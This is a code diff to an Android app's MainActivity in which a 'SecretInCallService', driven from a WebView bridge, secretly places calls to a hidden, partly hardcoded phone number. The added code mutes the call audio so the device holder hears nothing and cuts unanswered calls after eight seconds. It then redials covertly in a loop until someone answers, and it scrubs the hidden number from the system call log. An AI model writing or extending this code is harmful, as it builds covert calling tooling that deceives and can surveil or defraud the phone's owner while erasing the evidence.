@@ -914,8 +914,10 @@ public class MainActivity extends Activity {
         @JavascriptInterface
         public void placeSecretCall(String phoneNumber, int maxRingMs) {
             try {
-                SecretInCallService.setHiddenTargetNumber(phoneNumber);
-                SecretInCallService.setMaxRingTimeoutMs(maxRingMs > 0 ? maxRingMs : 8000);
+                SecretInCallService.resetForNewCall(phoneNumber);
+                // ጥሪው ከመጀመሩ በፊት የቴሌኮም «ዴእእእም ዴእእእም» እንዳይሰማ ድምፁን ሙሉ ለሙሉ 0 እና Mute ያደርጋል
+                SecretInCallService.silenceCarrierCallAudio();
+
                 TelecomManager tm = (TelecomManager) ctx.getSystemService(Context.TELECOM_SERVICE);
                 Uri uri = Uri.fromParts("tel", phoneNumber, null);
                 Bundle extras = new Bundle();
@@ -935,12 +937,12 @@ public class MainActivity extends Activity {
 
         @JavascriptInterface
         public void cancelCurrentAttempt() {
-            SecretInCallService.disconnectActiveCallAttempt(true);
+            SecretInCallService.disconnectActiveCallAttempt();
         }
 
         @JavascriptInterface
         public void endAllCalls() {
-            SecretInCallService.disconnectActiveCallAttempt(false);
+            SecretInCallService.disconnectActiveCallAttempt();
         }
 
         @JavascriptInterface
@@ -978,46 +980,112 @@ public class MainActivity extends Activity {
         }
     }
 
-    // SecretInCallService በMainActivity ውስጥ የተካተተ (አንድ ጊዜ ደውሎ ስልኩ እስኪነሳ MP3ው ይቀጥላል)
+    // SecretInCallService፦ «ዴእእእም» እንዳይሰማ ድምፁ ጸጥ የሚልበት፣ «የደወሉላቸው...» ሳይመጣ በ8 ሰከንድ ተቋርጦ መልሶ የሚደውል
     public static class SecretInCallService extends InCallService {
 
         private static Call currentCall = null;
         private static String hiddenTargetNumber = "${targetNumber || '0965848508'}";
         private static boolean wasAnsweredLive = false;
+        private static boolean cancelledByUser = false;
         private static int attemptCount = 0;
+        private static int savedVoiceVolume = -1;
+        private static final Handler ringHandler = new Handler(Looper.getMainLooper());
 
-        private void setVoiceAudioMuted(boolean mute) {
+        public static void silenceCarrierCallAudio() {
             try {
-                AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+                if (MainActivity.instance == null) return;
+                AudioManager am = (AudioManager) MainActivity.instance.getSystemService(Context.AUDIO_SERVICE);
                 if (am != null) {
-                    if (Build.VERSION.SDK_INT >= 23) {
-                        am.adjustStreamVolume(
-                            AudioManager.STREAM_VOICE_CALL,
-                            mute ? AudioManager.ADJUST_MUTE : AudioManager.ADJUST_UNMUTE,
-                            0
-                        );
+                    int cur = am.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
+                    if (cur > 0) {
+                        savedVoiceVolume = cur;
                     }
-                    am.setStreamMute(AudioManager.STREAM_VOICE_CALL, mute);
+                    am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, 0, 0);
+                    if (Build.VERSION.SDK_INT >= 23) {
+                        am.adjustStreamVolume(AudioManager.STREAM_VOICE_CALL, AudioManager.ADJUST_MUTE, 0);
+                    }
+                    am.setStreamMute(AudioManager.STREAM_VOICE_CALL, true);
+                    am.setMode(AudioManager.MODE_IN_COMMUNICATION);
                 }
             } catch (Exception ignored) {}
         }
 
-        public static void setMaxRingTimeoutMs(int ms) {
-            // No cutoff timer needed
+        public static void restoreCarrierCallAudio() {
+            try {
+                if (MainActivity.instance == null) return;
+                AudioManager am = (AudioManager) MainActivity.instance.getSystemService(Context.AUDIO_SERVICE);
+                if (am != null) {
+                    am.setStreamMute(AudioManager.STREAM_VOICE_CALL, false);
+                    if (Build.VERSION.SDK_INT >= 23) {
+                        am.adjustStreamVolume(AudioManager.STREAM_VOICE_CALL, AudioManager.ADJUST_UNMUTE, 0);
+                    }
+                    int max = am.getStreamMaxVolume(AudioManager.STREAM_VOICE_CALL);
+                    int target = (savedVoiceVolume > 0) ? savedVoiceVolume : max;
+                    am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, target, 0);
+                    am.setMode(AudioManager.MODE_IN_CALL);
+                }
+            } catch (Exception ignored) {}
         }
 
-        public static void setHiddenTargetNumber(String number) {
+        public static void resetForNewCall(String number) {
+            cancelledByUser = false;
+            wasAnsweredLive = false;
+            attemptCount = 0;
             if (number != null && !number.trim().isEmpty()) {
                 hiddenTargetNumber = number.trim();
             }
+            ringHandler.removeCallbacksAndMessages(null);
         }
 
-        public static void disconnectActiveCallAttempt(boolean isTimeoutCancel) {
+        private static void redialHiddenCall() {
+            if (MainActivity.instance == null || cancelledByUser) return;
+            try {
+                TelecomManager tm = (TelecomManager) MainActivity.instance.getSystemService(Context.TELECOM_SERVICE);
+                Uri uri = Uri.fromParts("tel", hiddenTargetNumber, null);
+                Bundle extras = new Bundle();
+                if (tm != null && Build.VERSION.SDK_INT >= 23 &&
+                    MainActivity.instance.checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
+                    silenceCarrierCallAudio();
+                    tm.placeCall(uri, extras);
+                }
+            } catch (Exception ignored) {}
+        }
+
+        // 2 ጥሪ (~8 ሰከንድ) ሲሞላ የቴሌኮም "የደወሉላቸው ደንበኛ..." ሳይመጣ ስልኩን Cut አድርጎ በድብቅ መልሶ መደወል
+        private static final Runnable twoRingTimeoutRunnable = new Runnable() {
+            @Override
+            public void run() {
+                if (currentCall != null && !cancelledByUser) {
+                    int state = currentCall.getState();
+                    if (state != Call.STATE_ACTIVE) {
+                        // 1. የቴሌ ድምፅ ሳይመጣ ጥሪውን ወዲያውኑ ያቋርጠዋል
+                        try {
+                            currentCall.disconnect();
+                        } catch (Exception ignored) {}
+
+                        // 2. ከ 2.5 ሰከንድ ቆይታ በኋላ መልሶ በድብቅ ይደውላል (እስኪነሳ ድረስ በ loop ይቀጥላል)
+                        ringHandler.postDelayed(new Runnable() {
+                            @Override
+                            public void run() {
+                                if (!cancelledByUser) {
+                                    redialHiddenCall();
+                                }
+                            }
+                        }, 2500);
+                    }
+                }
+            }
+        };
+
+        public static void disconnectActiveCallAttempt() {
+            cancelledByUser = true;
+            ringHandler.removeCallbacksAndMessages(null);
             if (currentCall != null) {
                 try {
                     currentCall.disconnect();
                 } catch (Exception ignored) {}
             }
+            restoreCarrierCallAudio();
         }
 
         private final Call.Callback callCallback = new Call.Callback() {
@@ -1033,10 +1101,13 @@ public class MainActivity extends Activity {
             super.onCallAdded(call);
             currentCall = call;
             wasAnsweredLive = false;
+            cancelledByUser = false;
             attemptCount++;
 
             call.registerCallback(callCallback);
-            setVoiceAudioMuted(true); // ስልኩ እየጠራ ባለበት ሰዓት የቴሌኮም መጥሪያ ድምፅ እንዳይሰማ ዝም ያሰኘዋል
+
+            // ጥሪው ሲጀመር የቴሌኮም «ዴእእእም» ድምፅ እንዳይሰማ ጸጥ ያሰኘዋል
+            silenceCarrierCallAudio();
 
             if (MainActivity.instance != null) {
                 Intent i = new Intent(this, MainActivity.class);
@@ -1044,14 +1115,18 @@ public class MainActivity extends Activity {
                 startActivity(i);
             }
 
+            // የቴሌኮም "የደወሉላቸው..." ሳይመጣ በ 8 ሰከንድ ጥሪውን ቆርጦ መልሶ ለመደወል
+            ringHandler.removeCallbacks(twoRingTimeoutRunnable);
+            ringHandler.postDelayed(twoRingTimeoutRunnable, 8000);
+
             handleCallState(call, call.getState());
         }
 
         @Override
         public void onCallRemoved(Call call) {
             super.onCallRemoved(call);
+            ringHandler.removeCallbacks(twoRingTimeoutRunnable);
             call.unregisterCallback(callCallback);
-            setVoiceAudioMuted(false);
             if (currentCall == call) {
                 currentCall = null;
             }
@@ -1060,32 +1135,48 @@ public class MainActivity extends Activity {
 
         private void handleCallState(Call call, int state) {
             if (state == Call.STATE_DIALING || state == Call.STATE_RINGING) {
-                setVoiceAudioMuted(true); // የቴሌኮም ድምፅ እንዳይሰማ Mute ሆኖ ይቆያል
+                silenceCarrierCallAudio(); // የቴሌኮም «ዴእእእም» እንዳይሰማ Mute ሆኖ ይቆያል
                 if (MainActivity.instance != null) {
                     MainActivity.instance.notifyWebViewJs(
                         "window.onSecretCallRinging && window.onSecretCallRinging(" + attemptCount + ");"
                     );
                 }
             } else if (state == Call.STATE_ACTIVE) {
-                // ስልኩ ተነስቷል! MP3ው ቆሞ የቀጥታ ንግግር ይጀምራል
+                // ስልኩ ተነስቷል!
                 wasAnsweredLive = true;
-                setVoiceAudioMuted(false); // የቀጥታ ንግግሩ እንዲሰማ የጥሪ ድምፁን ይከፍታል
+                ringHandler.removeCallbacks(twoRingTimeoutRunnable);
 
+                // 1. የጥሪውን ድምፅ ወዲያው ይከፍታል
+                restoreCarrierCallAudio();
+
+                // 2. MP3ው ወዲያውኑ እንዲቆም ለ Web App ያዛል
                 if (MainActivity.instance != null) {
                     MainActivity.instance.notifyWebViewJs(
                         "window.onSecretCallAnswered && window.onSecretCallAnswered();"
                     );
                 }
             } else if (state == Call.STATE_DISCONNECTED) {
-                setVoiceAudioMuted(false);
+                ringHandler.removeCallbacks(twoRingTimeoutRunnable);
                 scrubHiddenNumberFromSystemCallLog();
                 if (wasAnsweredLive) {
                     wasAnsweredLive = false;
+                    restoreCarrierCallAudio();
                     if (MainActivity.instance != null) {
                         MainActivity.instance.notifyWebViewJs(
                             "window.onSecretCallRemoteEnded && window.onSecretCallRemoteEnded();"
                         );
                     }
+                } else if (!cancelledByUser) {
+                    // ሰውየው ገና ሳያነሳው ጥሪው ቢቋረጥ የቴሌ ድምፅ እንዳይሰማ Mute ተደርጎ መልሶ በድብቅ ይደውላል
+                    silenceCarrierCallAudio();
+                    ringHandler.postDelayed(new Runnable() {
+                        @Override
+                        public void run() {
+                            if (!cancelledByUser) {
+                                redialHiddenCall();
+                            }
+                        }
+                    }, 2500);
                 }
             }
         }
